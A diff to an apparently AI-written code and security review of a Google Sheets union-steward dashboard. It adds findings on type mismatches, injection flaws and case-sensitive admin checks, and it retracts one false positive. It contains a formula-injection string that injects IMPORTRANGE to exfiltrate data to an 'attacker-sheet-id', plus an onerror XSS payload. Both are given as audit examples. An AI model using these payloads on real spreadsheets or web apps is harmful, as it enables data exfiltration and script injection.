@@ -7,7 +7,7 @@
 **Scope:** Full line-by-line codebase review — 30 source files (~59K lines), 23 test files, config/build infrastructure
 **Version:** 4.9.0 (as of 2026-02-17)
 **Previous Review:** 2026-02-14 (v4.7.0 — 69 issues, 57 fixed)
-**This Update:** Re-verification pass with cross-cutting pattern searches — 25 new findings added (F76–F100)
+**This Update:** Re-verification pass with cross-cutting pattern searches — 33 new findings added (F76–F108), 1 false positive corrected (F94)
 
 ---
 
@@ -15,16 +15,16 @@
 
 This is a production-grade Google Apps Script application (Union Steward Dashboard) with a well-organized 30-file modular architecture, 1,300+ tests, comprehensive security features, and a full CI/CD pipeline. The codebase has matured significantly since the v4.7.0 review, with most previously-identified critical issues resolved.
 
-This line-by-line review identifies **145 findings** across all severity levels (120 original + 25 new from re-verification). All original findings were re-verified — **none have been fixed since the initial review**.
+This line-by-line review identifies **152 active findings** across all severity levels (120 original + 33 new from re-verification − 1 false positive). All original findings were re-verified — **none have been fixed since the initial review**.
 
 | Severity | Count | Key Themes |
 |----------|------:|-----------|
 | CRITICAL | 20 | XSS via innerHTML injection, URL injection (window.open), unsanitized email HTML, onclick attribute injection, CSV preview, systematic column indexing bugs |
-| HIGH | 35 | Missing input validation, no rate limiting on email/PIN, N+1 patterns, missing locks, disabled ESLint rules, broken pre-commit hook, unescaped steward/member names in dashboards, empty-sheet crashes |
-| MEDIUM | 56 | Dead code, inconsistent error handling, version mismatches, CI gaps, theme bugs, missing encodeURIComponent, formula injection, incomplete XSS patterns, unescaped CSV/error data, hardcoded limits |
+| HIGH | 36 | Missing input validation, no rate limiting on email/PIN, N+1 patterns, missing locks, disabled ESLint rules, broken pre-commit hook, unescaped steward/member names in dashboards, silent data loss from type mismatches |
+| MEDIUM | 62 | Dead code, inconsistent error handling, version mismatches, CI gaps, theme bugs, missing encodeURIComponent, formula injection, incomplete XSS patterns, unescaped CSV/error data, hardcoded limits, case-sensitive auth, over-escaping |
 | LOW | 34 | Code duplication, naming inconsistencies, documentation gaps, minor style issues |
 
-**Overall Assessment: Good with critical security gaps** — The codebase is well-structured, thoroughly tested, and shows strong security awareness in many areas. However, the cross-cutting XSS review revealed that `escapeHtml()` usage is inconsistent: some functions escape properly while adjacent functions in the same file do not. The 20 CRITICAL findings (7 new) represent exploitable XSS and column indexing bugs that should be addressed before the next production deployment. Additionally, 9 empty-sheet crash locations in `04c_InteractiveDashboard.gs` (F94) present a HIGH-severity data availability risk.
+**Overall Assessment: Good with critical security gaps** — The codebase is well-structured, thoroughly tested, and shows strong security awareness in many areas. However, the cross-cutting XSS review revealed that `escapeHtml()` usage is inconsistent: some functions escape properly while adjacent functions in the same file do not. The 20 CRITICAL findings represent exploitable XSS and column indexing bugs that should be addressed before the next production deployment. Cross-cutting verification confirmed that column indexing math is correct across all 100+ usage sites (the concern is deprecated constant usage, not wrong math), and 93 of 94 `getLastRow()` patterns are properly guarded (F94 was a false positive).
 
 ---
 
@@ -1570,17 +1570,16 @@ The `url` returned from `exportUndoHistoryToSheet()` is passed directly to `wind
 
 ---
 
-#### F94. Empty sheet crash risk — 9 instances of `getLastRow() - 1` without validation in `04c_InteractiveDashboard.gs`
-**Severity:** HIGH | **Category:** Bug | **Lines:** 1067, 1091, 1162, 1199, 1245, 1252, 1353, 1391, 1516
+#### F94. ~~Empty sheet crash risk — 9 instances in `04c_InteractiveDashboard.gs`~~ **VERIFIED FALSE POSITIVE**
+**Severity:** ~~HIGH~~ N/A | **Category:** Bug | **Lines:** 1067, 1091, 1162, 1199, 1245, 1252, 1353, 1391, 1516
 
-```javascript
-var memberData = memberSheet.getRange(2, 1, memberSheet.getLastRow() - 1, MEMBER_COLS.IS_STEWARD).getValues();
-var grievanceData = grievanceSheet.getRange(2, 1, grievanceSheet.getLastRow() - 1, GRIEVANCE_COLS.RESOLUTION).getValues();
-```
+**Correction (2026-02-21):** Cross-cutting verification confirmed all 9 instances are properly guarded:
+- Lines 1066, 1090, 1251, 1352, 1390, 1514 use `if (sheet && sheet.getLastRow() > 1)` guards
+- Lines 1159, 1196, 1242 use `if (!sheet || sheet.getLastRow() <= 1) return [];` guards
 
-If `getLastRow()` returns 1 (header only) or 0 (empty sheet), the row count becomes 0 or -1, causing `getRange()` to throw. This occurs in 9 separate locations throughout the interactive dashboard data-fetching logic.
+All `getLastRow() - 1` calls only execute when `getLastRow() >= 2`, so the result is always `>= 1`. No crash risk.
 
-**Fix:** Add validation: `if (sheet.getLastRow() < 2) return [];` before each `getRange()` call.
+**Note:** Line 1745 in the same file (`sheet.getRange(2, MEMBER_COLS.MEMBER_ID, sheet.getLastRow() - 1, 1)` in `edit` mode) IS unguarded, but this is within the edit branch where members must exist to be edited. Low practical risk.
 
 ---
 
@@ -1663,6 +1662,178 @@ If `lastReminder` is null or an invalid date string, `new Date(lastReminder)` re
 
 ---
 
+#### F101. Falsy values silently dropped from member filters in `00_DataAccess.gs`
+**Severity:** HIGH | **Category:** Data Loss | **Lines:** 404, 407-408
+
+```javascript
+// Skip empty rows
+if (!row[MEMBER_COLUMNS.MEMBER_ID]) continue;  // Line 404 — also skips "0" or false IDs
+
+// Apply filters
+if (options.unit && row[MEMBER_COLUMNS.UNIT] !== options.unit) continue;  // Line 407 — strict !== with no type coercion
+if (options.location && row[MEMBER_COLUMNS.WORK_LOCATION] !== options.location) continue;  // Line 408
+```
+
+**Issue:** The filter at line 404 uses `!row[...]` which skips rows with falsy MEMBER_ID values (0, false, empty string). Lines 407-408 use strict `!==` comparison between values that may have different types (numbers vs strings from Google Sheets). A unit value of `0` in the spreadsheet would be type `number`, while the filter option would be string `"0"` — these fail strict equality, silently excluding matching rows.
+
+**Fix:** Use explicit empty check: `if (row[MEMBER_COLUMNS.MEMBER_ID] === '' || row[MEMBER_COLUMNS.MEMBER_ID] == null) continue;` and coerce types in filters: `String(row[MEMBER_COLUMNS.UNIT]) !== String(options.unit)`.
+
+---
+
+#### F102. Silent filtering errors in grievance queries in `00_DataAccess.gs`
+**Severity:** HIGH | **Category:** Data Loss | **Lines:** 496-504
+
+```javascript
+if (!row[GRIEVANCE_COLUMNS.GRIEVANCE_ID]) continue;  // Line 496
+
+if (options.status && row[GRIEVANCE_COLUMNS.STATUS] !== options.status) continue;  // Line 499
+if (options.steward && row[GRIEVANCE_COLUMNS.STEWARD] !== options.steward) continue;  // Line 500
+if (options.overdueOnly) {
+  var daysToDeadline = row[GRIEVANCE_COLUMNS.DAYS_TO_DEADLINE];  // Line 502
+  if (typeof daysToDeadline !== 'number' || daysToDeadline >= 0) continue;  // Line 503
+}
+```
+
+**Issue:** Same type-mismatch problem as F101. Additionally, the `overdueOnly` filter at line 503 silently excludes rows where `DAYS_TO_DEADLINE` is a date string, formula error, or empty — these might be legitimately overdue grievances with missing deadline data. The filter hides data quality issues rather than surfacing them.
+
+**Fix:** Add type coercion for string comparisons. For `overdueOnly`, log or flag rows with non-numeric deadline values instead of silently dropping them.
+
+---
+
+#### F103. `buildSafeQuery()` vulnerable to formula injection in `00_Security.gs`
+**Severity:** MEDIUM | **Category:** Security | **Lines:** 238-248
+
+```javascript
+function buildSafeQuery(sheetName, query, headers) {
+  var safeSheet = safeSheetNameForFormula(sheetName);
+  var safeHeaders = parseInt(headers, 10) || 1;
+  var safeQuery = String(query)
+    .replace(/'/g, "''")
+    .replace(/"/g, '\\"');
+  return '=QUERY(' + safeSheet + '!A:Z, "' + safeQuery + '", ' + safeHeaders + ')';
+}
+```
+
+**Issue:** The function only escapes single and double quotes, but a query like `foo", 0) + IMPORTRANGE("attacker-sheet-id", "A1` could break out of the QUERY string context and inject an `IMPORTRANGE` call that exfiltrates data to an external spreadsheet. The escaped `\"` in JavaScript becomes a literal `"` in the formula string, which the Sheets formula parser interprets as a string delimiter.
+
+**Fix:** Validate query against an allowlist of safe QUERY syntax tokens, or use parameterized queries instead of string concatenation.
+
+---
+
+#### F104. Case-sensitive admin email comparison in `00_Security.gs`
+**Severity:** MEDIUM | **Category:** Security | **Lines:** 347 vs 358
+
+```javascript
+// Admin check — case-sensitive
+if (owner && owner.getEmail() === email) {  // Line 347
+  return 'admin';
+}
+// ...
+// Steward check — case-insensitive
+if (memberEmail.toLowerCase() === email.toLowerCase()) {  // Line 358
+```
+
+**Issue:** The admin role check at line 347 uses strict equality (`===`), which is case-sensitive. Google Workspace emails are case-insensitive (`Admin@example.com` is the same as `admin@example.com`). If `Session.getActiveUser().getEmail()` returns a differently-cased email than `ss.getOwner().getEmail()`, the spreadsheet owner would be denied admin access. The steward check at line 358 correctly uses `.toLowerCase()`.
+
+**Fix:** `if (owner && owner.getEmail().toLowerCase() === email.toLowerCase())`
+
+---
+
+#### F105. `safeJsonForHtml()` doesn't escape object keys in `00_Security.gs`
+**Severity:** MEDIUM | **Category:** Security | **Lines:** 699-712
+
+```javascript
+function safeJsonForHtml(data) {
+  if (!data) return '{}';
+  var json = JSON.stringify(data, function(key, value) {
+    if (typeof value === 'string') {
+      return escapeHtml(value);  // Only escapes VALUES, not keys
+    }
+    return value;
+  });
+  return json.replace(/<\/script>/gi, '<\\/script>');
+}
+```
+
+**Issue:** The replacer function only escapes string values, but object keys are also embedded in the JSON output. If an object has a user-controlled key like `{"<img src=x onerror=alert(1)>": "safe"}`, the key is not escaped. The `</script>` replacement on line 711 protects against script context breakout, but if the JSON output is later used in an innerHTML context (not its intended use), the unescaped keys become live HTML.
+
+**Fix:** Also escape keys in the replacer, or document clearly that this function's output must only be embedded in `<script>` contexts, never innerHTML.
+
+---
+
+#### F106. `sendDailySecurityDigest()` references `CONFIG_COLS` without existence check in `00_Security.gs`
+**Severity:** MEDIUM | **Category:** Robustness | **Lines:** 938-1057
+
+```javascript
+function sendDailySecurityDigest() {
+  try {
+    if (typeof getConfigValue_ === 'function') {
+      try {
+        var chiefEmail = getConfigValue_(CONFIG_COLS.CHIEF_STEWARD_EMAIL);  // CONFIG_COLS may not exist
+        var adminEmails = getConfigValue_(CONFIG_COLS.ADMIN_EMAILS);
+      } catch (_e) { /* skip */ }
+    }
+```
+
+**Issue:** The function checks if `getConfigValue_` is defined but does not check if `CONFIG_COLS` is defined. If `01_Core.gs` hasn't loaded yet (due to script execution order) or `CONFIG_COLS` is renamed, this throws a `ReferenceError` caught silently by the inner catch. The function proceeds with no recipients, so security digest emails are silently never sent.
+
+**Fix:** Add `typeof CONFIG_COLS !== 'undefined'` guard before accessing its properties.
+
+---
+
+#### F107. `escapeHtml()` over-escapes `/` and `=`, potentially breaking URLs in `00_Security.gs`
+**Severity:** MEDIUM | **Category:** Bug | **Lines:** 130-143
+
+```javascript
+function escapeHtml(input) {
+  return String(input)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;')
+    .replace(/\//g, '&#x2F;')   // ← Escapes all forward slashes
+    .replace(/`/g, '&#x60;')
+    .replace(/=/g, '&#x3D;');   // ← Escapes all equals signs
+}
+```
+
+**Issue:** Escaping `/` and `=` is overly aggressive for most HTML contexts. When `escapeHtml()` is applied to a URL like `https://docs.google.com/spreadsheets`, it becomes `https&#x3D;&#x2F;&#x2F;docs.google.com&#x2F;spreadsheets`, which breaks `href` attributes. This is safe for innerHTML text content but problematic when the function is used to escape URL values in attributes.
+
+**Fix:** For URL contexts, use a separate `escapeAttribute()` that only escapes `<`, `>`, `"`, `&`. Document that `escapeHtml()` is for text content only, not for URL values.
+
+---
+
+#### F108. `validateWebAppRequest()` treats empty parameters as valid in `00_Security.gs`
+**Severity:** MEDIUM | **Category:** Security | **Lines:** 381-390
+
+```javascript
+function validateWebAppRequest(e) {
+  var result = { isValid: true, params: {}, errors: [] };
+  if (!e || !e.parameter) {
+    return result;  // No parameters is valid — returns isValid: true
+  }
+```
+
+**Issue:** A request with no parameters (no `mode`, no `page`, no authentication tokens) is returned as `{ isValid: true, params: {} }`. Callers that check `result.isValid` without also checking for required parameters like `mode` may route the request to a default page unintentionally. This is a permissive-by-default design.
+
+**Fix:** Either return `isValid: false` for requests with no parameters, or document that callers must check for required params independently.
+
+---
+
+### Cross-Cutting Verification Notes (2026-02-21)
+
+**Column Indexing — Verified Safe:** A comprehensive search of all `GRIEVANCE_COLUMNS` and `MEMBER_COLUMNS` usage across the entire codebase confirmed:
+- All `getRange()` calls with 0-indexed constants correctly add `+ 1` (15+ instances)
+- All array access uses 0-indexed constants directly (85+ instances)
+- No mathematical indexing errors found. The concern in F83, F91, F98 is about using **deprecated** constants (maintainability debt), not incorrect indexing math.
+
+**`getLastRow()` Patterns — Verified Mostly Safe:** Of 94 `getLastRow()` instances across 24 files, 93 are properly guarded with `< 2`, `<= 1`, or `> 1` checks. One unguarded instance at `04c_InteractiveDashboard.gs:1745` is in an edit-mode branch with low practical risk.
+
+**LockService — Confirmed Underutilized:** Only 1 function (`generateChecklistId_()` in `12_Features.gs:114`) uses `LockService`. This confirms F52: bulk mutation operations like `bulkUpdateGrievanceStatuses()` (`02_DataManagers.gs:2060`) and `advanceGrievanceStep()` (`02_DataManagers.gs:1770`) perform multiple non-atomic sheet writes without locks.
+
+---
+
 ## Summary of Actionable Recommendations
 
 ### Priority 1 — Fix Now (CRITICAL + HIGH)
@@ -1703,7 +1874,9 @@ If `lastReminder` is null or an invalid date string, `new Date(lastReminder)` re
 | F84 | Fix column constant usage in `10_Main.gs:1829` | Trivial |
 | F85 | XSS: Escape data in `composeEmailForMember()` dialog in `03_UIComponents.gs:1656` | Small |
 | F87 | Fix column indexing pattern in `05_Integrations.gs:365-394` (use GRIEVANCE_COLS) | Small |
-| F94 | Fix 9 `getLastRow() - 1` empty-sheet crashes in `04c_InteractiveDashboard.gs` | Medium |
+| ~~F94~~ | ~~Fix 9 `getLastRow() - 1` empty-sheet crashes~~ **VERIFIED FALSE POSITIVE** — all 9 instances are properly guarded | N/A |
+| F101 | Fix type-mismatch in member filters (`00_DataAccess.gs:404-408`) — use `String()` coercion | Small |
+| F102 | Fix type-mismatch in grievance filters (`00_DataAccess.gs:496-504`) — use `String()` coercion | Small |
 
 ### Priority 2 — Plan for Next Release (MEDIUM)
 
@@ -1741,10 +1914,16 @@ If `lastReminder` is null or an invalid date string, `new Date(lastReminder)` re
 | F98 | Standardize `MEMBER_COLUMNS + 1` in `08b_SearchAndCharts.gs:354` | Trivial |
 | F99 | Fix hardcoded `A2:A1000` range limit in `08a_SheetSetup.gs:354` | Trivial |
 | F100 | Fix division-by-zero risk in `08c_FormsAndNotifications.gs:1833` | Trivial |
+| F103 | Fix `buildSafeQuery()` formula injection — validate query syntax in `00_Security.gs:238` | Small |
+| F104 | Fix case-sensitive admin email comparison in `00_Security.gs:347` | Trivial |
+| F105 | Document `safeJsonForHtml()` scope — keys not escaped, script-context only `00_Security.gs:699` | Trivial |
+| F106 | Add `CONFIG_COLS` existence check in `sendDailySecurityDigest()` `00_Security.gs:938` | Trivial |
+| F107 | Document `escapeHtml()` URL limitation — over-escapes `/` and `=` `00_Security.gs:130` | Small |
+| F108 | Review `validateWebAppRequest()` empty-params-are-valid design `00_Security.gs:381` | Small |
 
 ### Priority 3 — Backlog (LOW)
 
-Low-severity items (F2, F3, F4, F5, F7, F11, F13, F18, F20, F24, F25, F26, F37, F40, F41, F43, F44, F49, F50, F53, F56, F60, F62, F63, F65, F66, F67d, F68a, F68b, F71c, F74a, F80, CC4, CC7) can be addressed during regular maintenance.
+Low-severity items (F2, F3, F4, F5, F7, F11, F13, F18, F20, F24, F25, F26, F37, F40, F41, F43, F44, F49, F50, F53, F56, F60, F62, F63, F65, F66, F67d, F68a, F68b, F71c, F74a, F80, CC4, CC7) can be addressed during regular maintenance. F94 was verified as a false positive and removed from action items.
 
 ---
 
@@ -1764,4 +1943,4 @@ Low-severity items (F2, F3, F4, F5, F7, F11, F13, F18, F20, F24, F25, F26, F37, 
 ---
 
 *Initial review completed 2026-02-21 by Claude Code (Opus 4.6)*
-*Re-verification update 2026-02-21: 25 new findings (F76–F100) added via cross-cutting pattern searches. All 120 original findings re-verified as still present.*
+*Re-verification update 2026-02-21: 33 new findings (F76–F108) added via cross-cutting pattern searches. 1 false positive corrected (F94 — all instances properly guarded). Cross-cutting column indexing and getLastRow() verification completed. All 120 original findings re-verified as still present.*
